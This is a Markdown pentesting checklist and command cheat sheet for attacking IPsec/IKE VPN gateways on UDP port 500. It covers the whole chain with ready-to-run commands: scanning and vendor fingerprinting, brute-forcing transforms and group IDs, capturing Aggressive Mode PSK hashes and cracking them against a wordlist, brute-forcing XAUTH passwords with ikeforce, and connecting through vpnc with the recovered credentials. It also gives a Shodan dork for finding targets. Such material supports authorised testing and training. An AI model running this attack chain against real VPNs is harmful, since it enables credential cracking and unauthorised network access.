# IPsec / IKE VPN (Port 500/UDP) Pentesting Checklist & Commands

## üéØ What am I realistically expecting to find here?

‚≠ê After enumerating IKE on port 500/UDP, I realistically expect to find:

- [ ] Open ISAKMP service confirming IPsec VPN
- [ ] Supported IKE phases and modes (Main / Aggressive)
- [ ] Valid transform proposals (Encryption, Hash, DH Group, Auth type)
- [ ] Pre-Shared Key (PSK) hashes (if Aggressive mode enabled)
- [ ] VPN vendor fingerprinting (Cisco, Juniper, etc.)
- [ ] Possible weak DH groups (1,2)
- [ ] Group Names / IDs for Aggressive Mode
- [ ] XAUTH credentials (username/password)

---

## ‚úÖ IPsec / IKE VPN Pentest Checklist

- [ ] **Scan for Open Port 500/UDP**
    ```bash
    nmap -sU -p 500 <IP>
    ```

- [ ] **Basic Discovery of ISAKMP / IKE**
    ```bash
    ike-scan -M <IP>
    ```

    - Main mode handshake shows supported transform:
        - Encryption (e.g. 3DES)
        - Hash (e.g. SHA1)
        - DH Group (e.g. modp1024)
        - Auth type (e.g. PSK)
    - Look for **"1 returned handshake"** indicating valid transform.

- [ ] **Brute-Force Transforms if Necessary**
    - Generate dictionary:
        ```bash
        for ENC in ...; do for HASH in ...; do for AUTH in ...; do for GROUP in ...; do echo "--trans=$ENC,$HASH,$AUTH,$GROUP" >> ike-dict.txt; done; done; done; done
        ```
    - Brute-force transforms:
        ```bash
        while read line; do (echo "Valid trans found: $line" && ike-scan -M $line <IP>) | grep "Valid trans found"; done < ike-dict.txt
        ```
    - Try **Aggressive Mode**:
        ```bash
        ike-scan -M --aggressive <IP>
        ```

- [ ] **Fingerprint VPN Vendor**
    - Identify vendor using backoff patterns and VID:
        ```bash
        ike-scan -M --showbackoff <IP>
        ```
    - Alternative with Nmap:
        ```bash
        nmap -sU -p 500 --script ike-version <IP>
        ```

- [ ] **Brute-Force Group Names (IDs)**
    - Check if Aggressive Mode responds to fake ID:
        ```bash
        ike-scan -P -M -A -n fakeID <IP>
        ```
    - If no fake hash returned, brute-force group IDs:
        ```bash
        while read line; do (echo "Found ID: $line" && ike-scan -M -A -n $line <IP>) | grep "Found ID:"; done < groupnames.txt
        ```
    - Use **iker.py** or **ikeforce** as alternative tools:
        ```bash
        ./ikeforce.py <IP> -e -w ./wordlists/groupnames.dic
        ```

- [ ] **Capture PSK Hash**
    - If Aggressive mode supported and group ID is known:
        ```bash
        ike-scan -M -A -n <ID> --pskcrack=hash.txt <IP>
        ```
    - Crack PSK hash:
        ```bash
        psk-crack -d <wordlist> hash.txt
        ```

- [ ] **Brute-Force XAUTH (if applicable)**
    - Using ikeforce:
        ```bash
        ./ikeforce.py <IP> -b -i <GROUP_ID> -u <USERNAME> -k <PSK> -w passwords.txt
        ```

- [ ] **Establish VPN Connection (if creds found)**
    - Configure VPNC on Kali:
        ```
        cat > /etc/vpnc/vpntest.conf << EOF
        IPSec gateway <IP>
        IPSec ID <GROUP_ID>
        IPSec secret <PSK>
        IKE Authmode psk
        Xauth username <USER>
        Xauth password <PASS>
        EOF
        vpnc vpntest
        ifconfig tun0
        ```

- [ ] **Sniff Group IDs on Network**
    - Use Wireshark or tcpdump to capture Aggressive Mode packets (IDs often in clear).

---

## ‚úÖ IPsec / IKE Useful Commands

- **Quick Check with Nmap**
    ```bash
    nmap -sU -p 500 <IP>
    nmap -sU -p 500 --script ike-version <IP>
    ```

- **Basic Ike-scan Example**
    ```bash
    ike-scan -M <IP>
    ike-scan -M --aggressive <IP>
    ```

- **Vendor Fingerprinting**
    ```bash
    ike-scan -M --showbackoff <IP>
    ```

- **PSK Hash Capture and Crack**
    ```bash
    ike-scan -M -A -n <ID> --pskcrack=hash.txt <IP>
    psk-crack -d /usr/share/wordlists/rockyou.txt hash.txt
    ```

- **ikeforce Tool Example**
    ```bash
    git clone https://github.com/SpiderLabs/ikeforce.git
    ./ikeforce.py <IP> -e -w ./wordlists/groupnames.dic
    ./ikeforce.py <IP> -b -i <GROUP_ID> -u <USERNAME> -k <PSK> -w passwords.txt
    ```

---

## ‚úÖ Shodan Dork

- `port:500 IKE`

---

## ‚úÖ Notes

- Aggressive Mode exposes hashes vulnerable to offline cracking.
- Weak DH groups (modp1024) are susceptible to precomputation attacks.
- XAUTH often integrated with Active Directory / RADIUS.
- Valid transform discovery is key before further exploitation.
